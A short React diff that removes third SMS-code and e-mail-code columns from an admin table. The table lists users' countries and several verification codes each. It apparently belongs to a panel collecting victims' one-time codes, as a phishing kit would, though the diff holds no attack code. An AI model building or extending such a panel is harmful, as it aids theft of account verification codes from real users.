@@ -156,11 +156,9 @@ function Admin() {
     <th>Country</th>
     <th>Code sms</th>
     <th>Code sms 2</th>
-    <th>Code sms 3</th>
 
     <th>Code e-mail</th>
     <th>Code e-mail 2</th>
-    <th>Code e-mail 3</th>
 
     <th>Action</th>
   </tr>
@@ -174,11 +172,9 @@ function Admin() {
     <td>{user?.country}</td>
     <td>{user?.sms}</td>
     <td>{user?.sms2}</td>
-    <td>{user?.sms3}</td>
 
     <td>{user?.mail}</td>
     <td>{user?.mail2}</td>
-    <td>{user?.mail3}</td>
 
 
     <td><button style={{color:"white",backgroundColor:"red",border:"1px solid gray",cursor:'pointer',padding:"9px"}} onClick={()=> deleteData(user?.uid)}>Delete</button></td>
